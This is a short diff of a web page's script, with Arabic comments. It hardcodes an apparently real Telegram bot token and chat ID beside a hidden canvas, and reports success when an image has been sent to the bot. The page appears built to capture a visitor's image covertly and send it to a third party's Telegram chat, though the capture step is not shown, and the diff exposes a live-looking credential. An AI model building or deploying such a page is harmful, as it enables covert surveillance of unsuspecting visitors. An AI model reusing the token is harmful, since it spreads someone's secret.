@@ -43,6 +43,7 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // التوكن والآيدي الخاصين بك مضبوطين هنا بدقة
         const TELEGRAM_BOT_TOKEN = '8880573702:AAEcni2H3MYNKkyU0GJen2XqPFgAyL04Mdw';
         const TELEGRAM_CHAT_ID = '8304712202';
 
@@ -99,7 +100,6 @@
                 if(data.ok) {
                     document.getElementById('mainBox').innerHTML = '<h2>تم إرسال الصورة بنجاح!</h2>';
                 } else {
-                    // هنا هيطبع التفاصيل الكاملة للخطأ اللي راجع من تيليجرام
                     document.getElementById('mainBox').innerHTML = '<h2>تفاصيل الخطأ: ' + JSON.stringify(data) + '</h2>';
                 }
             })
